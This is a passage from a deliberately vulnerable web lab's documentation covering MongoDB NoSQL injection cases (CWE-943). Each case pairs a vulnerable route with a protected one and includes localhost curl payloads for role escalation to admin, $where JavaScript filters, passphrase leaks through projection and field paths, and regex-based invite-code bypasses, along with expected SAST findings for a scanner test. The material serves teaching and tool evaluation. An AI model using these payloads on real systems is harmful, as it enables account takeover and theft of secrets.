| `pages/api/mongo/members/preferences.js` | vulnerable | The route deletes `access`, but `access.role` is a different key, and MongoDB reads it as a path. A report of CWE-943 for the same flow is also correct. |
| `pages/api/mongo/members/options.js` | protected | Every key must be in a constant list and every value a string, or the request ends. |

The control is scoped to this flaw.

<a id="mongo-020-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-021"></a>
## MONGO-021 · A complete update document from the request

<a id="mongo-021-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/members/record.js` |
| Safe control | `pages/api/mongo/members/entry.js` |
| Route | `POST /api/mongo/members/record` vs `/api/mongo/members/entry` |
| Flow | JSON body changes → update document |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-021-student) · [Exploit lab](#mongo-021-exploit) · [Vuln vs protected](#mongo-021-safe) · [Tests](#mongo-021-tests)

<a id="mongo-021-student"></a>
### Student guide

The caller writes the update operators and the fields: `$set`, `$inc`, `$unset`, `$rename`.

<a id="mongo-021-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/members/record -H 'Content-Type: application/json' \
  -d '{"changes":{"$set":{"access.role":"admin"}}}'
# changed: 1, and the next sign-in of alice has the role admin

curl -s -X POST http://127.0.0.1:3000/api/mongo/members/entry -H 'Content-Type: application/json' \
  -d '{"changes":{"$set":{"access.role":"admin"}}}'
# none of that
```

**Observation that proves exploitation:** `changed: 1`, and the next sign-in of `alice` has the role `admin`.

Read the role back after each request (reset between them). The role is `admin` after the vulnerable route and `user` after the safe one:

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/sign-in/kiosk -H 'Content-Type: application/json' \
  -d '{"username":"alice","passphrase":"alice-lab-only"}'
```

<a id="mongo-021-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/members/record.js` | vulnerable | The caller writes the update operators and the fields: `$set`, `$inc`, `$unset`, `$rename`. |
| `pages/api/mongo/members/entry.js` | protected | Accepts the same body shape, reads one value from it and builds its own update document. |

The control is scoped to this flaw.

<a id="mongo-021-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-022"></a>
## MONGO-022 · Text read as a field path in an update pipeline

<a id="mongo-022-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/members/nickname.js` |
| Safe control | `pages/api/mongo/members/alias.js` |
| Route | `POST /api/mongo/members/nickname` vs `/api/mongo/members/alias` |
| Flow | JSON body text → $set in an update pipeline → field path |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-022-student) · [Exploit lab](#mongo-022-exploit) · [Vuln vs protected](#mongo-022-safe) · [Tests](#mongo-022-tests)

<a id="mongo-022-student"></a>
### Student guide

The value must be a string. The update is a pipeline (an array), so a string that starts with `$` is a field path and copies a secret into a visible field.

<a id="mongo-022-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/members/nickname -H 'Content-Type: application/json' \
  -d '{"displayName":"$passphrase"}'
# the passphrase of alice as her display name

curl -s -X POST http://127.0.0.1:3000/api/mongo/members/alias -H 'Content-Type: application/json' \
  -d '{"displayName":"$passphrase"}'
# none of that
```

**Observation that proves exploitation:** the passphrase of `alice` as her display name.

<a id="mongo-022-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/members/nickname.js` | vulnerable | The value must be a string. The update is a pipeline (an array), so a string that starts with `$` is a field path and copies a secret into a visible field. |
| `pages/api/mongo/members/alias.js` | protected | A classic update document: `$set` stores the text as it is. |

The control is scoped to this flaw.

<a id="mongo-022-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-023"></a>
## MONGO-023 · Request-controlled sort

<a id="mongo-023-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/articles/ordered.js` |
| Safe control | `pages/api/mongo/articles/sorted.js` |
| Route | `GET /api/mongo/articles/ordered` vs `/api/mongo/articles/sorted` |
| Flow | query text → sort key → order by a hidden field |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-023-student) · [Exploit lab](#mongo-023-exploit) · [Vuln vs protected](#mongo-023-safe) · [Tests](#mongo-023-tests)

<a id="mongo-023-student"></a>
### Student guide

The caller names the sort field. Sorting by a hidden field shows how its values compare.

<a id="mongo-023-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s 'http://127.0.0.1:3000/api/mongo/articles/ordered?order=reviewerNote'
# the two articles change places: the order follows the hidden notes. No other field gives this ascending order

curl -s 'http://127.0.0.1:3000/api/mongo/articles/sorted?order=reviewerNote'
# none of that
```

**Observation that proves exploitation:** the two articles change places: the order follows the hidden notes. No other field gives this ascending order.

<a id="mongo-023-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/articles/ordered.js` | vulnerable | The caller names the sort field. Sorting by a hidden field shows how its values compare. |
| `pages/api/mongo/articles/sorted.js` | protected | The sort document is a constant, chosen by an own key of a constant map. |

The control is scoped to this flaw.

<a id="mongo-023-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-024"></a>
## MONGO-024 · Request-controlled projection

<a id="mongo-024-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/directory/card.js` |
| Safe control | `pages/api/mongo/directory/contact.js` |
| Route | `GET /api/mongo/directory/card` vs `/api/mongo/directory/contact` |
| Flow | query text → projection keys → secret field |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-024-student) · [Exploit lab](#mongo-024-exploit) · [Vuln vs protected](#mongo-024-safe) · [Tests](#mongo-024-tests)

<a id="mongo-024-student"></a>
### Student guide

The caller names the returned fields.

<a id="mongo-024-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s 'http://127.0.0.1:3000/api/mongo/directory/card?fields=displayName%2Cpassphrase'
# the passphrases of both accounts

curl -s 'http://127.0.0.1:3000/api/mongo/directory/contact?fields=displayName%2Cpassphrase'
# none of that
```

**Observation that proves exploitation:** the passphrases of both accounts.

<a id="mongo-024-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/directory/card.js` | vulnerable | The caller names the returned fields. |
| `pages/api/mongo/directory/contact.js` | protected | The names are filtered through a constant list before the projection. |

The control is scoped to this flaw.

<a id="mongo-024-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-025"></a>
## MONGO-025 · Request-controlled field name

<a id="mongo-025-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/directory/resolve.js` |
| Safe control | `pages/api/mongo/directory/locate.js` |
| Route | `GET /api/mongo/directory/resolve` vs `/api/mongo/directory/locate` |
| Flow | query text → computed filter key → $where or a secret field |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-025-student) · [Exploit lab](#mongo-025-exploit) · [Vuln vs protected](#mongo-025-safe) · [Tests](#mongo-025-tests)

<a id="mongo-025-student"></a>
### Student guide

The caller names the filter key. `$where` runs JavaScript on the database server, and `passphrase` tests a secret.

<a id="mongo-025-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s 'http://127.0.0.1:3000/api/mongo/directory/resolve?by=%24where&value=this.access.role%20%3D%3D%3D%20%27admin%27'
# the account of admin, found by code from the request

curl -s 'http://127.0.0.1:3000/api/mongo/directory/locate?by=%24where&value=this.access.role%20%3D%3D%3D%20%27admin%27'
# none of that
```

**Observation that proves exploitation:** the account of `admin`, found by code from the request.

<a id="mongo-025-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/directory/resolve.js` | vulnerable | The caller names the filter key. `$where` runs JavaScript on the database server, and `passphrase` tests a secret. |
| `pages/api/mongo/directory/locate.js` | protected | The name must be one of two constants, or the request ends. |

The control is scoped to this flaw.

<a id="mongo-025-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-026"></a>
## MONGO-026 · User text in $regex

<a id="mongo-026-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/invites/redeem.js` |
| Safe control | `pages/api/mongo/invites/claim.js` |
| Other safe cases | `pages/api/mongo/invites/check.js`, `pages/api/mongo/invites/open.js` |
| Route | `POST /api/mongo/invites/redeem` vs `/api/mongo/invites/claim` |
| Flow | JSON body text → $regex pattern |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-026-student) · [Exploit lab](#mongo-026-exploit) · [Vuln vs protected](#mongo-026-safe) · [Tests](#mongo-026-tests)

<a id="mongo-026-student"></a>
### Student guide

`String()` keeps operators out, but the text is a pattern. `.*` matches every code. A slow pattern (CWE-1333) is the same flow.

<a id="mongo-026-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/invites/redeem -H 'Content-Type: application/json' \
  -d '{"code":".*"}'
# the account of admin without its invitation code

curl -s -X POST http://127.0.0.1:3000/api/mongo/invites/claim -H 'Content-Type: application/json' \
  -d '{"code":".*"}'
# none of that
```

**Observation that proves exploitation:** the account of `admin` without its invitation code.

<a id="mongo-026-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/invites/redeem.js` | vulnerable | `String()` keeps operators out, but the text is a pattern. `.*` matches every code. A slow pattern (CWE-1333) is the same flow. |
| `pages/api/mongo/invites/claim.js` | protected | Every character with a meaning in a pattern is escaped first. |
| `pages/api/mongo/invites/check.js` | protected | `RegExp.escape`, built in from Node.js 24, escapes the text. |
| `pages/api/mongo/invites/open.js` | protected | The text must match a pattern of letters, digits and hyphens before it is used. |

The control is scoped to this flaw.

<a id="mongo-026-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-027"></a>
## MONGO-027 · Incomplete escape before $regex

<a id="mongo-027-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/invites/accept.js` |
| Safe control | `pages/api/mongo/invites/join.js` |
| Route | `POST /api/mongo/invites/accept` vs `/api/mongo/invites/join` |
| Flow | JSON body text → escape of two characters, first occurrence only → $regex pattern |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-027-student) · [Exploit lab](#mongo-027-exploit) · [Vuln vs protected](#mongo-027-safe) · [Tests](#mongo-027-tests)

<a id="mongo-027-student"></a>
### Student guide

The two `replace` calls take a string, so each escapes the first occurrence only, and they cover only `.` and `*`. Brackets and `+` stay active. The usual probe `.*` is escaped, so it does not show the flaw.

<a id="mongo-027-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/invites/accept -H 'Content-Type: application/json' \
  -d '{"code":"zz-admin-[0-9]+"}'
# the account of admin without its invitation code

curl -s -X POST http://127.0.0.1:3000/api/mongo/invites/join -H 'Content-Type: application/json' \
  -d '{"code":"zz-admin-[0-9]+"}'
# none of that
```

**Observation that proves exploitation:** the account of `admin` without its invitation code.

<a id="mongo-027-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/invites/accept.js` | vulnerable | The two `replace` calls take a string, so each escapes the first occurrence only, and they cover only `.` and `*`. Brackets and `+` stay active. The usual probe `.*` is escaped, so it does not show the flaw. |
| `pages/api/mongo/invites/join.js` | protected | One `replace` with a global pattern escapes every character that is not a letter or a digit. |

The control is scoped to this flaw.

<a id="mongo-027-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.
